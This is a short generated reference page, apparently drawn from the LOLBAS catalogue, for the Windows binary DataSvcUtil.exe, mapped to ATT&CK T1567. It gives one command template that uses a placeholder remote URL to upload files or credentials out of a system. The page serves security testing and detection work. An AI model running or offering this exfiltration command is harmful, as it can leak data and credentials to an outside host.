---
parsed_by: focuslocust
source: commands
type: generated
---
# DataSvcUtil Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## DataSvcUtil.exe

Tool page: [DataSvcUtil.exe](../../tools/windows/datasvcutil.exe.md)

### Upload file

```text
DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}
```

Description:

Upload file, credentials or data exfiltration in general

Related ATT&CK:

- [T1567](../../attack/techniques/T1567-exfiltration-over-web-service.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/DataSvcUtil.yml` |
| Evidence | Command preserved from source parser. |
